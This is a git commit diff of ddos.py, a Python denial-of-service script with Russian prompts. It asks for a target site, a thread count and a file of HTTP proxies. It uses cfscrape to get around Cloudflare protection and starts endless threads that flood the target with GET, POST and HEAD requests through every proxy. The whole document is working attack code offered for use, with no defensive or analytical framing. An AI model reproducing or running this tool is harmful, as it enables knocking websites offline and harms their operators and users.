87d4077dc22e83bab7dfdebbfd34d4d20610693a
VaRaMBaZ1 <92698950+VaRaMBaZ1@users.noreply.github.com>
2022-07-19 02:19:50 +0800

    Add files via upload

--- ddos.py
+++ ddos.py
@@ -1,10 +1,10 @@
-import random
 import cfscrape
 import threading
 
 adress = input('Адрес сайта: ')
 thread = int(input('Потоки: '))
 proxy_file_name = input('Название вайла с http прокси: ')
+cf = cfscrape.create_scraper()
 
 with open(proxy_file_name, 'r') as file:
     proxy_http = ''.join(file.readlines()).strip().split('\n')
@@ -12,49 +12,34 @@ with open(proxy_file_name, 'r') as file:
 with open('useragent', 'r') as useragent:
     userag = ''.join(useragent.readlines()).strip().split('\n')
 
-def attack_1(url, proxy, headers):
-    cf = cfscrape.CloudflareScraper()
+def attack_1(url, proxy, scrape):
     while True:
         proxieshttp = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
-        head = random.choice(headers)
-        header = {'user-agent': head}
+        try:
+            scrape.get(url, proxies=proxieshttp)
+        except:
+            print('Ошибка!')
 
-        try:
-            cf.get(url, proxies=proxieshttp, headers=header)
-        except:
-            pass
-        try:
-            cf.post(url, proxies=proxieshttp, headers=header)
-        except:
-            pass
-        try:
-            cf.head(url, proxies=proxieshttp, headers=header)
-        except:
-            pass
-
-def attack_2(url, proxy, headers):
-    cf = cfscrape.CloudflareScraper()
+def attack_2(url, proxy, scrape):
     while True:
-        proxiessocks = {'http': f'socks5://{proxy}', 'https': f'socks5://{proxy}'}
-        head = random.choice(headers)
-        header = {'user-agent': head}
+        proxieshttp = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
+        try:
+            scrape.post(url, proxies=proxieshttp)
+        except:
+            print('Ошибка!')
 
+def attack_3(url, proxy, scrape):
+    while True:
+        proxieshttp = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
         try:
-            cf.get(url, proxies=proxiessocks, headers=header)
+            scrape.head(url, proxies=proxieshttp)
         except:
-            pass
-        try:
-            cf.post(url, proxies=proxiessocks, headers=header)
-        except:
-            pass
-        try:
-            cf.head(url, proxies=proxiessocks, headers=header)
-        except:
-            pass
+            print('Ошибка!')
 
 print('Запуск потоков!')
 for i in range(thread):
     for a in proxy_http:
-        threading.Thread(target=attack_1, args=(adress, a, userag)).start()
-        threading.Thread(target=attack_2, args=(adress, a, userag)).start()
+        threading.Thread(target=attack_1, args=(adress, a, cf,)).start()
+        threading.Thread(target=attack_2, args=(adress, a, cf, )).start()
+        threading.Thread(target=attack_3, args=(adress, a, cf, )).start()
 print('Все потоки запущены!')
